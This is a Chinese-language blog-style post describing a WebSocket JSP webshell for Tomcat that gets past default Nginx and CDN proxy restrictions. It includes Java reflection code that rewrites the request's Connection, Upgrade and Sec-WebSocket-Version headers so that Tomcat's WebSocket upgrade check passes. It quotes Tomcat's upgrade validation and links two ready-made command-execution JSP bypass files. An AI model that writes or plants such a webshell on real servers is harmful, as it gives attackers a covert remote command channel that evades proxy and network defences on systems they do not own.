# 无需注入，可以绕过Nginx、CDN代理限制的 WebSocket jsp马

之前提到过可以向 WsServerContainer 容器内 添加ServerEndpointConfig 来注册WebSocket内存马，这样即有好处也有弊端，好处是内存马无落地文件，不好的地方是容易受限制无法使用。于是，我最近改写了下脚本的内容，直接取jsp内的request进行协议升级，从而不需要进行注册路径等操作，增加了HttpServletRequest的Header，使其可以在Nginx代理默认配置下使用

Nginx默认代理配置本身是不支持WebSocket协议的，需要修改 /etc/nginx/conf.d/nginx.conf，增加 proxy_set_header 内容，网上也可以搜到许多资料，其实就是增加了两个文件头，并未做其他处理。

那其实我们完全可以在Server端拦截request自己添加文件头来支持WebSocket

```java
    private void SetHeader(HttpServletRequest request, String key, String value){
        Class<? extends HttpServletRequest> requestClass = request.getClass();
        try {
            Field requestField = requestClass.getDeclaredField("request");
            requestField.setAccessible(true);
            Object requestObj = requestField.get(request);
            Field coyoteRequestField = requestObj.getClass().getDeclaredField("coyoteRequest");
            coyoteRequestField.setAccessible(true);
            Object coyoteRequestObj = coyoteRequestField.get(requestObj);
            Field headersField = coyoteRequestObj.getClass().getDeclaredField("headers");
            headersField.setAccessible(true);
            MimeHeaders headersObj = (MimeHeaders)headersField.get(coyoteRequestObj);
            headersObj.removeHeader(key);
            headersObj.addValue(key).setString(value);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    SetHeader(request,"Connection","upgrade");
    SetHeader(request,"Sec-WebSocket-Version","13");
    SetHeader(request,"Upgrade","websocket");
```

通过添加这三个文件头，Tomcat就可以通过后续的doUpgrade校验了

```java
if (!headerContainsToken(req, Constants.CONNECTION_HEADER_NAME,
        Constants.CONNECTION_HEADER_VALUE)) {
    resp.sendError(HttpServletResponse.SC_BAD_REQUEST);
    return;
}
if (!headerContainsToken(req, Constants.WS_VERSION_HEADER_NAME,
        Constants.WS_VERSION_HEADER_VALUE)) {
    resp.setStatus(426);
    resp.setHeader(Constants.WS_VERSION_HEADER_NAME,
            Constants.WS_VERSION_HEADER_VALUE);
    return;
}
key = req.getHeader(Constants.WS_KEY_HEADER_NAME);
if (key == null) {
    resp.sendError(HttpServletResponse.SC_BAD_REQUEST);
    return;
}
```

Tomcat 是通过org.apache.tomcat.websocket.server.UpgradeUtil.doUpgrade 来把http协议升级为WebSocket

那把需要的内容传入进去，即可完成jsp文件连接WebSocket的功能

UpgradeUtil.doUpgrade(container, request, response, configEndpoint, pathParams);

绕过代码：[https://github.com/veo/wsMemShell/blob/main/BypassNginxCDN/cmdbypass.jsp](https://github.com/veo/wsMemShell/blob/main/BypassNginxCDN/cmdbypass.jsp)

绕过方式二代码：[https://github.com/veo/wsMemShell/blob/main/BypassNginxCDN/cmdbypass2.jsp](https://github.com/veo/wsMemShell/blob/main/BypassNginxCDN/cmdbypass2.jsp)
